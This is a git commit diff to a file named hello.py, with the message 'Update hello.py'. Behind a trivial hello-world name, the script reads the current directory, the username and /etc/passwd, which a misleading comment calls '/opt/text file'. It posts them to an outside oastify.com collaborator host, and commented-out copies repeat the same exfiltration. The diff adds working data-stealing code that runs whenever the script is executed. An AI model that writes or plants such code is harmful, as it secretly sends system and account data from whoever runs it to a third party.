af1b485caafa9185ec11f9adf53568170c06a0a6
MaorCY <124798781+MaorCY@users.noreply.github.com>
2024-07-24 16:56:20 +0300

    Update hello.py

--- hello.py
+++ hello.py
@@ -4,6 +4,7 @@
 
 # print("hello world")
 
+# ---------------------------
 
 # import os
 # import urllib.parse
@@ -28,6 +29,38 @@
 # with urllib.request.urlopen(url, data=encoded_data) as response:
 #     print(f'Data sent successfully to {url}')
 
+# -------------------------
+
+# import os
+# import pwd
+# import urllib.parse
+# import urllib.request
+
+# # Get the current working directory
+# current_directory = os.getcwd()
+
+# # Get the current user
+# user_info = pwd.getpwuid(os.getuid())
+# current_user = user_info.pw_name
+
+# # Define the URL to send the data
+# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
+
+# # Create a dictionary with the data to send
+# data = {
+#     'directory': current_directory,
+#     'user': current_user
+# }
+
+# # Encode the data for the URL
+# encoded_data = urllib.parse.urlencode(data).encode('utf-8')
+
+# # Send the data to the URL
+# with urllib.request.urlopen(url, data=encoded_data) as response:
+#     print(f'Data sent successfully to {url}')
+
+# -----------------------
+
 import os
 import pwd
 import urllib.parse
@@ -40,18 +73,33 @@ current_directory = os.getcwd()
 user_info = pwd.getpwuid(os.getuid())
 current_user = user_info.pw_name
 
+# Read the contents of /opt/text file
+opt_text_file_path = '/etc/passwd'
+try:
+    with open(opt_text_file_path, 'r') as opt_text_file:
+        opt_contents = opt_text_file.read()
+except FileNotFoundError:
+    opt_contents = "File not found."
+
 # Define the URL to send the data
 url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
 
 # Create a dictionary with the data to send
 data = {
     'directory': current_directory,
-    'user': current_user
+    'user': current_user,
+    'opt_contents': opt_contents
 }
 
 # Encode the data for the URL
-encoded_data = urllib.parse.urlencode(data).encode('utf-8')
+encoded_data = urllib.parse.urlencode(data, doseq=True).encode('utf-8')
 
 # Send the data to the URL
-with urllib.request.urlopen(url, data=encoded_data) as response:
-    print(f'Data sent successfully to {url}')
+try:
+    with urllib.request.urlopen(url, data=encoded_data) as response:
+        print(f'Data sent successfully to {url}')
+except urllib.error.URLError as e:
+    print(f'An error occurred: {e.reason}')
+
+# Print the contents of /opt/text file
+print(f"Contents of {opt_text_file_path}:\n{opt_contents}")
